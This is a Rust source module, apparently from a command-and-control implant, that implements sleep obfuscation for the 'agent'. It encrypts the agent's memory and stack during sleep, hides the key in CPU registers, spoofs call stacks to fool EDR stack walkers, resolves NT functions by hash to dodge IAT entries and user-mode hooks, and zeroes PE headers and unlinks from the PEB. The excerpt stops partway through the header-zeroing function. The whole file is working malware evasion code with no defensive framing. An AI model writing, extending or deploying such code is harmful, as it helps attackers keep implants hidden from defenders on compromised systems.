//! Advanced sleep obfuscation module.
//!
//! Replaces the previous Ekko/Foliage-style sleep with a comprehensive memory
//! encryption + anti-forensics sleep that:
//!
//! 1. Enumerates all agent memory regions via `NtQueryVirtualMemory` with a
//!    generation-counter cache to skip redundant queries.
//! 2. Encrypts all committed RWX/RW/ RX regions with **XChaCha20-Poly1305**
//!    using fresh nonces per region, in 64 KB chunks.  The 32-byte key is
//!    stashed in XMM14/XMM15 (Windows x86-64) or a locked heap page (Linux).
//! 3. Encrypts the stack from current RSP up to the TEB stack limit, leaving
//!    only the immediate frame intact.
//! 4. Spoofs the call stack via NtContinue-based spoofing so EDR walkers see:
//!      ntdll!RtlUserThreadStart → kernel32!BaseThreadInitThunk → fake_module!FakeExport
//! 5. Applies anti-forensics: zeroes PE headers, unlinks from PEB_LDR_DATA,
//!    sets PAGE_NOACCESS on encrypted regions.
//! 6. Uses `NtDelayExecution` for the actual sleep and a
//!    `CreateTimerQueueTimer` callback to handle the wake / decrypt / re-link
//!    sequence.
//! 7. On wake, verifies every XChaCha20-Poly1305 authentication tag.  If **any**
//!    tag mismatches (tampering / corruption), the agent terminates immediately
//!    via `NtTerminateProcess(-1, 1)`.
//!
//! # Feature gate
//!
//! The entire module is compiled only on `cfg(windows)`.

#![cfg(windows)]

use common::lock::MutexExt;
use anyhow::{anyhow, Result};
use chacha20::cipher::KeyIvInit;
use chacha20poly1305::{
    aead::{Aead, AeadInPlace, KeyInit, OsRng},
    XChaCha20Poly1305, XNonce,
};
use rand::RngCore;
use std::sync::OnceLock;
use zeroize::Zeroize;

// ── Constants ────────────────────────────────────────────────────────────────

/// Encryption chunk size — 64 KB balances memory bandwidth vs. nonce reuse
/// distance.
const CHUNK_SIZE: usize = 64 * 1024;

/// Maximum number of regions we track before bailing (safety limit).
const MAX_REGIONS: usize = 4096;

/// XChaCha20-Poly1305 nonce length.
const NONCE_LEN: usize = 24;
/// Poly1305 tag length.
const TAG_LEN: usize = 16;

/// Maximum nonce / tag storage (aligned to the largest scheme).
const MAX_NONCE: usize = 24;
const MAX_TAG: usize = 16;

/// Large integer for NtDelayExecution: negative = relative, in 100-ns units.
const fn duration_to_100ns(dur: std::time::Duration) -> i64 {
    -((dur.as_nanos() / 100) as i64)
}

/// IAT-free sleep: tries NtDelayExecution via pe_resolve, falls back to
/// `std::thread::sleep` if the NT function cannot be resolved.  Avoids
/// importing `kernel32!Sleep` which creates a visible IAT entry.
#[inline(always)]
unsafe fn sleep_no_iat(duration: std::time::Duration) {
    if let Some(ntdll) = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
        if let Some(addr) =
            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtDelayExecution\0"))
        {
            let nt_delay: extern "system" fn(u8, *mut i64) -> i32 = std::mem::transmute(addr);
            let mut delay_100ns = duration_to_100ns(duration);
            nt_delay(0, &mut delay_100ns);
            return;
        }
    }
    // Last resort: std::thread::sleep (still uses NtDelayExecution internally
    // on Windows but via rustc's runtime rather than a named IAT import).
    std::thread::sleep(duration);
}

// ── Region cache with generation counter ─────────────────────────────────────

/// Per-region metadata saved before encryption so we can restore on wake.
#[derive(Clone)]
struct RegionSnapshot {
    base: *mut u8,
    size: usize,
    /// Original page protection (PAGE_* constant).
    orig_protect: u32,
    /// Per-region XChaCha20-Poly1305 nonce.
    nonce: [u8; MAX_NONCE],
    /// AEAD authentication tag per chunk (flat, ceil(size/CHUNK_SIZE) entries).
    tags: Vec<[u8; TAG_LEN]>,
    /// Number of chunks.
    n_chunks: usize,
}

// P2-03: Zeroize sensitive fields on drop.
impl Drop for RegionSnapshot {
    fn drop(&mut self) {
        use zeroize::Zeroize;
        self.nonce.zeroize();
        for tag in &mut self.tags {
            tag.zeroize();
        }
    }
}

unsafe impl Send for RegionSnapshot {}
unsafe impl Sync for RegionSnapshot {}

/// CRIT-006: Single lock-protected struct combining generation counter and
/// cached region list.  Eliminates the TOCTOU window that existed when
/// `REGION_GENERATION` (AtomicU64) and `REGION_CACHE` (Mutex) were separate
/// statics — a thread could read the generation, get preempted, and then
/// observe a stale cache after another thread updated both.
struct RegionCacheEntry {
    generation: u64,
    regions: Vec<RegionSnapshot>,
}

static REGION_CACHE: OnceLock<std::sync::Mutex<RegionCacheEntry>> = OnceLock::new();

fn region_cache() -> &'static std::sync::Mutex<RegionCacheEntry> {
    REGION_CACHE.get_or_init(|| std::sync::Mutex::new(RegionCacheEntry {
        generation: 0,
        regions: Vec::new(),
    }))
}

// ── Sleep variant ────────────────────────────────────────────────────────────

/// Selects which sleep mechanism to use during `secure_sleep`.
///
/// - **Ekko**: Uses `NtDelayExecution` to suspend the thread.  This is the
///   classic approach but is heavily monitored by EDR hooks.
/// - **Cronus**: Uses an unnamed waitable timer via `NtSetTimer` with a
///   negative relative timeout.  The timer callback is a position-independent
///   XChaCha20 stub that encrypts memory in-place via a function pointer.
///   making it stealthier for long-duration sleeps.
///
/// Auto-select: when `Cronus` is chosen, the implementation verifies that
/// `NtSetTimer` can be resolved.  If resolution fails, it falls back to
/// `Ekko` with a log warning.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum SleepVariant {
    /// Classic NtDelayExecution-based sleep (legacy default).
    Ekko,
    /// Waitable-timer-based sleep via NtSetTimer (default).
    #[default]
    Cronus,
}

// ── Runtime variant override ────────────────────────────────────────────────

/// Global runtime override for the sleep variant, set by the
/// `Command::SetSleepVariant` handler.  When `Some`, this takes precedence
/// over the `SleepObfuscationConfig.variant` field.
static RUNTIME_VARIANT: std::sync::OnceLock<std::sync::Mutex<Option<SleepVariant>>> =
    std::sync::OnceLock::new();

fn runtime_variant() -> &'static std::sync::Mutex<Option<SleepVariant>> {
    RUNTIME_VARIANT.get_or_init(|| std::sync::Mutex::new(None))
}

/// Set the sleep variant at runtime (called from the `SetSleepVariant` command
/// handler).
pub fn set_sleep_variant(variant: SleepVariant) {
    let lock = runtime_variant();
    if let Ok(mut guard) = lock.lock() {
        *guard = Some(variant);
        tracing::info!(
            "[sleep_obfuscation] runtime sleep variant set to {:?}",
            variant
        );
    }
}

/// Resolve the effective variant: runtime override takes precedence, then
/// config, then default (Cronus).
fn resolve_variant(config_variant: SleepVariant) -> SleepVariant {
    if let Ok(guard) = runtime_variant().lock() {
        if let Some(override_v) = *guard {
            return override_v;
        }
    }
    config_variant
}

// ── Configuration ────────────────────────────────────────────────────────────

/// Configuration for a single `secure_sleep` invocation.
#[derive(Debug, Clone)]
pub struct SleepObfuscationConfig {
    /// How long to sleep (wall-clock) before decrypting and resuming.
    pub sleep_duration_ms: u64,
    /// 32-byte XChaCha20-Poly1305 encryption key.  When `None`, a random key
    /// is generated and stashed in XMM14/XMM15 (Windows x86-64) or a locked
    /// page (Linux).
    pub encryption_key: Option<[u8; 32]>,
    /// Encrypt the stack from RSP to the TEB stack limit (default: true).
    pub encrypt_stack: bool,
    /// Encrypt heap / data sections in addition to code (default: false).
    pub encrypt_heap: bool,
    /// Spoof the return address on the call stack (default: true).
    pub spoof_return_address: bool,
    /// Name of a fake module to show in the spoofed call stack (e.g.
    /// `"kernel32.dll"` or `"uxtheme.dll"`).
    pub fake_module_name: Option<String>,
    /// Zero PE headers, unlink from PEB, and set PAGE_NOACCESS during sleep
    /// (default: true).
    pub anti_forensics: bool,
    /// Which sleep variant to use: `Cronus` (waitable timer) or `Ekko`
    /// (NtDelayExecution).  Defaults to `Cronus`.
    pub variant: SleepVariant,
    /// Encrypt thread contexts (CONTEXT structs, TLS data) for all non-current
    /// threads during sleep.  Prevents forensic tools from recovering register
    /// state from suspended threads.  Requires `thread-ctx-encrypt` feature.
    /// (default: true).
    pub encrypt_thread_contexts: bool,
}

impl Default for SleepObfuscationConfig {
    fn default() -> Self {
        Self {
            sleep_duration_ms: 5000,
            encryption_key: None,
            encrypt_stack: true,
            encrypt_heap: false,
            spoof_return_address: true,
            fake_module_name: None,
            anti_forensics: true,
            variant: SleepVariant::default(),
            encrypt_thread_contexts: true,
        }
    }
}

// ── Key stashing ──────────────────────────────────────────────────────────────
//
// The 32-byte XChaCha20-Poly1305 encryption key is held in CPU registers
// during the sleep window so that it never resides in user-accessible memory.
//
// * **x86-64 Windows**: XMM14/XMM15 (128-bit each, non-volatile in the
//   Windows x64 calling convention).  The 256-bit key is split across the
//   two registers.
//
// * **ARM64 Windows**: NEON Q22/Q23 (128-bit each, callee-saved per the
//   ARM64 Windows ABI).  The 256-bit key is split across Q22 (key[0..15])
//   and Q23 (key[16..31]).  An additional 96-bit nonce slot uses Q21
//   (low 96 bits of the 128-bit register) for future use.  Q8–Q23 are
//   callee-saved on ARM64 Windows; we chose Q21/Q22/Q23 because they are
//   the highest-numbered callee-saved NEON registers, making them the
//   least likely to be used by compiler-generated crypto intrinsics or
//   C2 framework code that typically starts from Q0 upward.

// ── x86-64 Windows: XMM14 / XMM15 ──────────────────────────────────────────

/// Opaque handle holding the 32-byte key stashed in XMM14/XMM15 (x86-64)
/// or NEON Q22/Q23 (ARM64).
/// On drop the registers are zeroed.
#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
pub struct KeyHandle {
    // Marker to prevent external construction.
    _private: (),
}

#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
impl Drop for KeyHandle {
    fn drop(&mut self) {
        // Zero XMM14/XMM15 unconditionally.
        unsafe {
            std::arch::asm!(
                "pxor xmm14, xmm14",
                "pxor xmm15, xmm15",
                options(nostack, preserves_flags),
            );
        }
    }
}

#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
impl KeyHandle {
    /// Stash `key` into XMM14 (low 16 bytes) and XMM15 (high 16 bytes),
    /// then zero the stack copy.
    fn stash(mut key: [u8; 32]) -> Self {
        unsafe {
            std::arch::asm!(
                "movdqu xmm14, [{lo}]",
                "movdqu xmm15, [{hi}]",
                lo = in(reg) key.as_ptr(),
                hi = in(reg) key.as_ptr().add(16),
                options(nostack, preserves_flags),
            );
        }
        key.zeroize();
        KeyHandle { _private: () }
    }

    /// Retrieve the key from XMM14/XMM15 and zero the registers.
    fn retrieve(self) -> [u8; 32] {
        let mut out = [0u8; 32];
        unsafe {
            std::arch::asm!(
                "movdqu [{lo}], xmm14",
                "movdqu [{hi}], xmm15",
                lo = in(reg) out.as_mut_ptr(),
                hi = in(reg) out.as_mut_ptr().add(16),
                options(nostack, preserves_flags),
            );
            // Zero the register stash.
            std::arch::asm!(
                "pxor xmm14, xmm14",
                "pxor xmm15, xmm15",
                options(nostack, preserves_flags),
            );
        }
        out
    }
}

// ── ARM64 Windows: NEON Q22 / Q23 ──────────────────────────────────────────
//
// ARM64 Windows ABI (MSVC):
//   - Q8–Q23 are callee-saved (non-volatile across function calls).
//   - Q0–Q7, Q24–Q31 are caller-saved (volatile).
//   - We use Q22 and Q23 for the 256-bit key (highest callee-saved pair,
//     least likely to conflict with compiler-generated NEON intrinsics).
//   - Q21 is reserved for a future nonce slot (96 bits in low 12 bytes).
//
// Stash convention:
//   Q22 = key[0..15]  (low 128 bits of the 256-bit key)
//   Q23 = key[16..31] (high 128 bits of the 256-bit key)
//
// Integrity verification:
//   After stashing, we immediately read back Q22/Q23 into a temporary buffer
//   and compare against the original key.  A mismatch indicates register
//   pressure or inline-asm clobbering and is treated as a fatal error
//   (the key would be unrecoverable from NEON if stashing failed silently).

#[cfg(all(target_arch = "aarch64", target_os = "windows"))]
pub struct KeyHandle {
    _private: (),
}

#[cfg(all(target_arch = "aarch64", target_os = "windows"))]
impl Drop for KeyHandle {
    fn drop(&mut self) {
        // Zero Q22/Q23 unconditionally.
        unsafe {
            std::arch::asm!(
                "eor v22.16b, v22.16b, v22.16b",
                "eor v23.16b, v23.16b, v23.16b",
                options(nostack, preserves_flags),
            );
        }
    }
}

#[cfg(all(target_arch = "aarch64", target_os = "windows"))]
impl KeyHandle {
    /// Stash the 256-bit key into NEON Q22/Q23, then zero the memory copy.
    ///
    /// ## Register convention
    ///
    /// | Register | Content              |
    /// |----------|----------------------|
    /// | Q22      | key[0..15]  (lo 128) |
    /// | Q23      | key[16..31] (hi 128) |
    ///
    /// After stashing, a read-back verification is performed to confirm
    /// the key was correctly loaded into the NEON registers.
    fn stash(mut key: [u8; 32]) -> Self {
        unsafe {
            // Load key halves into Q22 and Q23 via NEON LDR instructions.
            // `ldr q22, [x_reg]` loads 16 bytes from the address in x_reg.
            std::arch::asm!(
                "ldr q22, [{lo}]",
                "ldr q23, [{hi}]",
                lo = in(reg) key.as_ptr(),
                hi = in(reg) key.as_ptr().add(16),
                options(nostack, preserves_flags),
            );

            // ── Integrity verification ──────────────────────────────────
            // Read back Q22/Q23 and compare against the original key to
            // confirm the stash succeeded.  This catches register-pressure
            // bugs where the compiler might have clobbered Q22/Q23 between
            // the two asm! blocks (unlikely but catastrophic if it occurs).
            let mut verify = [0u8; 32];
            std::arch::asm!(
                "str q22, [{lo}]",
                "str q23, [{hi}]",
                lo = in(reg) verify.as_mut_ptr(),
                hi = in(reg) verify.as_mut_ptr().add(16),
                options(nostack, preserves_flags),
            );

            if verify != key {
                // The key is still in memory at this point (not yet zeroed),
                // so the caller can retry or fall back.  Zero the NEON stash
                // to avoid leaving a partial key in registers.
                std::arch::asm!(
                    "eor v22.16b, v22.16b, v22.16b",
                    "eor v23.16b, v23.16b, v23.16b",
                    options(nostack, preserves_flags),
                );
                // This is a fatal error: we cannot safely proceed without
                // confidence that the key is recoverable from NEON.
                tracing::error!(
                    "[sleep_obfuscation] ARM64 NEON key stash verification FAILED — \
                     aborting to prevent key loss"
                );
                std::process::abort();
            }
        }
        // Zero the memory copy — key now lives only in Q22/Q23.
        key.zeroize();
        KeyHandle { _private: () }
    }

    /// Retrieve the 256-bit key from NEON Q22/Q23, then zero the registers.
    fn retrieve(self) -> [u8; 32] {
        let mut out = [0u8; 32];
        unsafe {
            // Read key from Q22/Q23 into the output buffer.
            std::arch::asm!(
                "str q22, [{lo}]",
                "str q23, [{hi}]",
                lo = in(reg) out.as_mut_ptr(),
                hi = in(reg) out.as_mut_ptr().add(16),
                options(nostack, preserves_flags),
            );
            // Zero the NEON register stash immediately after retrieval.
            std::arch::asm!(
                "eor v22.16b, v22.16b, v22.16b",
                "eor v23.16b, v23.16b, v23.16b",
                options(nostack, preserves_flags),
            );
        }
        out
    }
}

// ── NtQueryVirtualMemory ────────────────────────────────────────────────────

/// Result of a single NtQueryVirtualMemory call (MEMORY_BASIC_INFORMATION
/// subset that we care about).
#[repr(C)]
struct Mbi {
    base_address: *mut std::ffi::c_void,
    allocation_base: *mut std::ffi::c_void,
    allocation_protect: u32,
    region_size: usize,
    state: u32,
    protect: u32,
    type_: u32,
}

const MEM_COMMIT: u32 = 0x1000;

const PAGE_NOACCESS: u32 = 0x01;
const PAGE_EXECUTE: u32 = 0x10;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_READONLY: u32 = 0x02;
const PAGE_WRITECOPY: u32 = 0x08;
const PAGE_WRITECOMBINE: u32 = 0x400;
const PAGE_GUARD: u32 = 0x100;

/// Returns `true` if the protection flags indicate a region we want to
/// encrypt (code or data, but not noaccess / guard).
fn is_encodable_protect(prot: u32, include_heap: bool) -> bool {
    let masked = prot & !(PAGE_GUARD | PAGE_WRITECOMBINE | 0x100);
    if masked == PAGE_NOACCESS {
        return false;
    }
    // Code sections: always encrypt.
    if masked & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)
        != 0
    {
        return true;
    }
    // Data sections: only if encrypt_heap is enabled.
    if include_heap {
        if masked & (PAGE_READWRITE | PAGE_READONLY | PAGE_WRITECOPY) != 0 {
            return true;
        }
    }
    false
}

/// Walk the virtual address space of the current process and collect all
/// committed, encodable regions.
///
/// Skips the region containing our own stack frame (the caller of
/// `secure_sleep`) so we don't encrypt the housekeeping data needed to
/// decrypt.
unsafe fn enumerate_regions(include_heap: bool) -> Vec<(*mut u8, usize, u32)> {
    let mut regions = Vec::new();

    // Resolve NtQueryVirtualMemory via pe_resolve to avoid IAT hooks.
    let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
        Some(b) => b,
        None => return regions,
    };
    let func_addr = match pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtQueryVirtualMemory\0"),
    ) {
        Some(a) => a,
        None => return regions,
    };

    // P2-01: Alignment check — function pointers must be properly aligned.
    // If the resolved address is not 8-byte aligned, skip to avoid UB.
    if func_addr % 8 != 0 {
        tracing::warn!("[sleep_obfuscation] NtQueryVirtualMemory address {:#x} is not 8-byte aligned, skipping", func_addr);
        return regions;
    }

    let nt_query_vm: extern "system" fn(
        process_handle: usize,
        base_address: *mut std::ffi::c_void,
        memory_information_class: u32,
        memory_information: *mut std::ffi::c_void,
        memory_information_length: usize,
        return_length: *mut usize,
    ) -> i32 = std::mem::transmute(func_addr);

    let current_process: usize = (-1isize) as usize;
    let mut addr: *mut std::ffi::c_void = std::ptr::null_mut();

    loop {
        let mut mbi: Mbi = std::mem::zeroed();
        let mut ret_len: usize = 0;
        let status = nt_query_vm(
            current_process,
            addr,
            0, // MemoryBasicInformation
            &mut mbi as *mut _ as *mut std::ffi::c_void,
            std::mem::size_of::<Mbi>(),
            &mut ret_len,
        );
        if status != 0 {
            break; // STATUS_SUCCESS = 0
        }
        if mbi.region_size == 0 {
            break;
        }
        if mbi.state == MEM_COMMIT && is_encodable_protect(mbi.protect, include_heap) {
            let base = mbi.base_address as *mut u8;
            let size = mbi.region_size;
            // Skip regions smaller than 1 page (likely guard pages or
            // alignment padding).
            if size >= 4096 {
                regions.push((base, size, mbi.protect));
            }
        }
        addr = (mbi.base_address as usize + mbi.region_size) as *mut std::ffi::c_void;
    }

    regions
}

// ── NtProtectVirtualMemory (via indirect syscall) ────────────────────────────

/// Change page protection via indirect syscall through clean ntdll.
unsafe fn protect_memory(base: *mut u8, size: usize, new_prot: u32) -> Option<u32> {
    let mut base_addr = base as *mut std::ffi::c_void;
    let mut region_size = size;
    let mut old_prot: u32 = 0;

    #[cfg(feature = "direct-syscalls")]
    {
        let status = crate::syscalls::syscall_NtProtectVirtualMemory(
            (-1isize) as usize as u64,
            &mut base_addr as *mut _ as usize as u64,
            &mut region_size as *mut _ as usize as u64,
            new_prot as u64,
            &mut old_prot as *mut _ as usize as u64,
        );
        if status != 0 {
            return None;
        }
        Some(old_prot)
    }

    #[cfg(not(feature = "direct-syscalls"))]
    {
        // P2-03: Use NtProtectVirtualMemory from ntdll instead of
        // kernel32!VirtualProtect.  kernel32!VirtualProtect is a well-known
        // EDR hook target; NtProtectVirtualMemory resolves through ntdll's
        // export table via pe_resolve (runtime API hashing), avoiding both
        // static IAT entries and user-mode hooks on kernel32.
        let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
            Some(b) => b,
            None => return None,
        };
        let addr = match pe_resolve::get_proc_address_by_hash(
            ntdll,
            pe_resolve::hash_str(b"NtProtectVirtualMemory\0"),
        ) {
            Some(a) => a,
            None => return None,
        };
        // NtProtectVirtualMemory(
        //   ProcessHandle: HANDLE,
        //   BaseAddress:   *mut PVOID,
        //   RegionSize:    *mut SIZE_T,
        //   NewProtect:    ULONG,
        //   OldProtect:    *mut ULONG,
        // ) -> NTSTATUS
        type FnNtProtectVirtualMemory = unsafe extern "system" fn(
            usize,                      // ProcessHandle
            *mut *mut std::ffi::c_void, // BaseAddress
            *mut usize,                 // RegionSize
            u32,                        // NewProtect
            *mut u32,                   // OldProtect
        ) -> i32;
        let ntpvm: FnNtProtectVirtualMemory = std::mem::transmute(addr);
        let status = ntpvm(
            (-1isize) as usize, // Current process handle
            &mut base_addr,
            &mut region_size,
            new_prot,
            &mut old_prot,
        );
        if status != 0 {
            None
        } else {
            Some(old_prot)
        }
    }
}

// ── Chunked XChaCha20-Poly1305 encryption ────────────────────────────────────

/// Encrypt a single region in 64 KB chunks.
///
/// Returns per-chunk authentication tags so they can be verified on wake.
fn encrypt_region_chunks(
    key: &[u8; 32],
    base: *mut u8,
    size: usize,
) -> Result<([u8; MAX_NONCE], Vec<[u8; TAG_LEN]>)> {
    let mut nonce = [0u8; MAX_NONCE];
    OsRng.fill_bytes(&mut nonce[..NONCE_LEN]);
    let cipher = XChaCha20Poly1305::new_from_slice(key)
        .map_err(|_| anyhow!("XChaCha20-Poly1305 key init failed"))?;

    let n_chunks = (size + CHUNK_SIZE - 1) / CHUNK_SIZE;
    let mut tags = Vec::with_capacity(n_chunks);

    let ptr = base as *mut u8;
    let mut offset = 0usize;
    let mut chunk_idx: u32 = 0;
    while offset < size {
        let end = (offset + CHUNK_SIZE).min(size);
        let chunk_len = end - offset;

        // P2-06: Counter-based nonce derivation — overwrite (not XOR) the
        // last 4 bytes of the base nonce with the chunk counter (big-endian).
        // This guarantees unique nonces across all 2^32 chunks without the
        // collision risk of XOR derivation (where e.g. chunk 1 with base
        // ending in 0x01 and chunk 0 with base ending in 0x00 could produce
        // related nonces under certain XOR patterns).
        let mut chunk_nonce = nonce;
        let ctr_bytes = chunk_idx.to_be_bytes();
        chunk_nonce[NONCE_LEN - 4] = ctr_bytes[0];
        chunk_nonce[NONCE_LEN - 3] = ctr_bytes[1];
        chunk_nonce[NONCE_LEN - 2] = ctr_bytes[2];
        chunk_nonce[NONCE_LEN - 1] = ctr_bytes[3];
        let xnonce = XNonce::from_slice(&chunk_nonce[..NONCE_LEN]);

        // For AEAD we need to encrypt in-place but the API returns ct || tag.
        // Copy the chunk to a temp buffer, encrypt, write ciphertext back,
        // save the tag.
        let chunk_slice = unsafe { std::slice::from_raw_parts(ptr.add(offset), chunk_len) };
        let ct_tag = cipher
            .encrypt(xnonce, chunk_slice as &[u8])
            .map_err(|_| anyhow!("XChaCha20-Poly1305 encryption failed"))?;

        // ct_tag = [ciphertext || tag(16 bytes)]
        let ct_len = ct_tag.len() - TAG_LEN;
        unsafe {
            std::ptr::copy_nonoverlapping(ct_tag.as_ptr(), ptr.add(offset), ct_len);
        }

        let mut tag = [0u8; TAG_LEN];
        tag.copy_from_slice(&ct_tag[ct_len..]);
        tags.push(tag);

        offset = end;
        chunk_idx += 1;
    }

    Ok((nonce, tags))
}

/// Decrypt a single region in 64 KB chunks and verify every authentication tag.
///
/// Returns `Err` if any tag fails verification (indicates tampering / corruption).
fn decrypt_region_chunks(
    key: &[u8; 32],
    base: *mut u8,
    size: usize,
    nonce: &[u8; MAX_NONCE],
    tags: &[[u8; TAG_LEN]],
) -> Result<()> {
    let cipher = XChaCha20Poly1305::new_from_slice(key)
        .map_err(|_| anyhow!("XChaCha20-Poly1305 key init failed"))?;

    let ptr = base as *mut u8;
    let mut offset = 0usize;
    let mut chunk_idx: u32 = 0;

    while offset < size {
        let end = (offset + CHUNK_SIZE).min(size);
        let chunk_len = end - offset;
        let tag = tags
            .get(chunk_idx as usize)
            .ok_or_else(|| anyhow!("missing tag for chunk {} of region {:p}", chunk_idx, base))?;

        // P2-06: Counter-based nonce derivation — overwrite last 4 bytes with
        // chunk counter (big-endian), matching the encryption side.
        let mut chunk_nonce = *nonce;
        let ctr_bytes = chunk_idx.to_be_bytes();
        chunk_nonce[NONCE_LEN - 4] = ctr_bytes[0];
        chunk_nonce[NONCE_LEN - 3] = ctr_bytes[1];
        chunk_nonce[NONCE_LEN - 2] = ctr_bytes[2];
        chunk_nonce[NONCE_LEN - 1] = ctr_bytes[3];
        let xnonce = XNonce::from_slice(&chunk_nonce[..NONCE_LEN]);

        // Build ct || tag for decryption.
        let mut combined = Vec::with_capacity(chunk_len + TAG_LEN);
        unsafe {
            combined.extend_from_slice(std::slice::from_raw_parts(ptr.add(offset), chunk_len));
        }
        combined.extend_from_slice(tag);

        let pt = cipher.decrypt(xnonce, combined.as_slice()).map_err(|_| {
            anyhow!(
                "[sleep_obfuscation] AEAD tag mismatch for chunk {} of \
                 region {:p} (size {}): memory may have been tampered with",
                chunk_idx,
                base,
                size
            )
        })?;

        unsafe {
            std::ptr::copy_nonoverlapping(pt.as_ptr(), ptr.add(offset), pt.len());
        }

        // P2-04: Zeroize sensitive buffers after use.
        combined.zeroize();
        drop(pt);

        offset = end;
        chunk_idx += 1;
    }

    Ok(())
}

// ── Stack encryption ─────────────────────────────────────────────────────────

/// Get the current thread's stack base (TEB StackLimit) and the current stack
/// pointer.
///
/// Returns `(stack_limit, current_sp)`.
///
/// # x86-64
///
/// TEB is read from `gs:[0x60]` (x86-64 TEB self-pointer).  StackLimit is at
/// TEB+0x08, current RSP via `mov {}, rsp`.
///
/// # ARM64
///
/// TEB is read from `tpidr_el0` (thread-pointer register on ARM64 Windows).
/// The TEB layout is identical to x86-64 at the relevant offsets.
/// StackLimit is at TEB+0x08, current SP via `mov {}, sp`.
unsafe fn get_stack_bounds() -> (*mut u8, *mut u8) {
    #[cfg(target_arch = "x86_64")]
    {
        let teb: usize;
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) teb, options(nostack, nomem, preserves_flags));
        // TEB + 0x08 = StackLimit (lowest address of the stack)
        let stack_limit = *((teb + 0x08) as *const usize) as *mut u8;
        let rsp: usize;
        std::arch::asm!("mov {}, rsp", out(reg) rsp, options(nostack, nomem, preserves_flags));
        let current_sp = rsp as *mut u8;
        (stack_limit, current_sp)
    }

    #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
    {
        let teb: usize;
        // On ARM64 Windows, tpidr_el0 holds the TEB pointer (equivalent to
        // gs:[0x60] on x86-64).  The TEB structure layout is the same for
        // both architectures at the StackLimit/StackBase offsets.
        std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, nomem));
        let stack_limit = *((teb + 0x08) as *const usize) as *mut u8;
        let sp: usize;
        std::arch::asm!("mov {}, sp", out(reg) sp, options(nostack, nomem));
        let current_sp = sp as *mut u8;
        (stack_limit, current_sp)
    }
}

/// Encrypt the stack from the TEB StackLimit up to (but not including) the
/// current frame.  We leave `safety_bytes` (default 512) at the top unencrypted
/// so the current function's housekeeping data survives.
unsafe fn encrypt_stack(
    key: &[u8; 32],
    safety_bytes: usize,
) -> Option<(*mut u8, usize, u32, [u8; MAX_NONCE], [u8; TAG_LEN])> {
    let (stack_limit, current_rsp) = get_stack_bounds();

    // Calculate the region to encrypt: from stack_limit up to
    // current_rsp - safety_bytes.
    let encrypt_end = current_rsp.sub(safety_bytes);
    if encrypt_end <= stack_limit {
        return None; // Nothing to encrypt.
    }
    let size = encrypt_end as usize - stack_limit as usize;
    if size == 0 {
        return None;
    }

    // Make the region writable (stack is normally RW already, but be safe).
    let orig_prot = match protect_memory(stack_limit, size, PAGE_READWRITE) {
        Some(p) => p,
        None => return None,
    };

    // Encrypt the entire stack region as one chunk (no per-chunk split needed
    // for stack since it's typically < 1 MB).
    let mut nonce = [0u8; MAX_NONCE];
    OsRng.fill_bytes(&mut nonce[..NONCE_LEN]);

    let cipher = match XChaCha20Poly1305::new_from_slice(key) {
        Ok(c) => c,
        Err(_) => return None,
    };
    let xnonce = XNonce::from_slice(&nonce[..NONCE_LEN]);
    let plain = std::slice::from_raw_parts(stack_limit, size);
    let ct_tag = match cipher.encrypt(xnonce, plain as &[u8]) {
        Ok(ct) => ct,
        Err(_) => return None,
    };

    let ct_len = ct_tag.len() - TAG_LEN;
    std::ptr::copy_nonoverlapping(ct_tag.as_ptr(), stack_limit, ct_len);
    let mut tag = [0u8; TAG_LEN];
    tag.copy_from_slice(&ct_tag[ct_len..]);

    Some((stack_limit, size, orig_prot, nonce, tag))
}

/// Decrypt the stack region previously encrypted by `encrypt_stack`.
unsafe fn decrypt_stack(
    key: &[u8; 32],
    base: *mut u8,
    size: usize,
    nonce: &[u8; MAX_NONCE],
    tag: &[u8; TAG_LEN],
) -> Result<()> {
    let cipher = XChaCha20Poly1305::new_from_slice(key)
        .map_err(|_| anyhow!("stack decrypt key init failed"))?;
    let xnonce = XNonce::from_slice(&nonce[..NONCE_LEN]);

    let mut combined = Vec::with_capacity(size + TAG_LEN);
    combined.extend_from_slice(std::slice::from_raw_parts(base, size));
    combined.extend_from_slice(tag);

    let pt = cipher.decrypt(xnonce, combined.as_slice()).map_err(|_| {
        anyhow!("[sleep_obfuscation] Stack AEAD tag mismatch: possible memory tampering")
    })?;

    std::ptr::copy_nonoverlapping(pt.as_ptr(), base, pt.len());
    Ok(())
}

// ── Anti-forensics: PE header zeroing & PEB unlinking ────────────────────────

/// Zero the PE header of the agent's own image in memory.
unsafe fn zero_pe_headers() {
    #[cfg(target_arch = "x86_64")]
    let base: *mut u8 = {
        let teb: usize;
        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb, options(nostack, nomem, preserves_flags));
        let peb = *((teb + 0x60) as *const usize) as *const u8;
        *(peb.add(0x10) as *const usize) as *mut u8
    };
    #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
    let base: *mut u8 = {
        let teb: usize;
        std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, nomem));
        let peb = *((teb + 0x60) as *const usize) as *const u8;
        *(peb.add(0x10) as *const usize) as *mut u8
    };
    #[cfg(not(any(
        target_arch = "x86_64",
        all(target_arch = "aarch64", target_os = "windows")
    )))]
    let base: *mut u8 = std::ptr::null_mut();

    if base.is_null() {
        return;
    }

    // Read the e_lfanew offset from the DOS header.
    let dos_e_magic = base as *const u16;
    if *dos_e_magic != 0x5A4D {
        // MZ signature missing — not a valid PE image.
        return;
    }
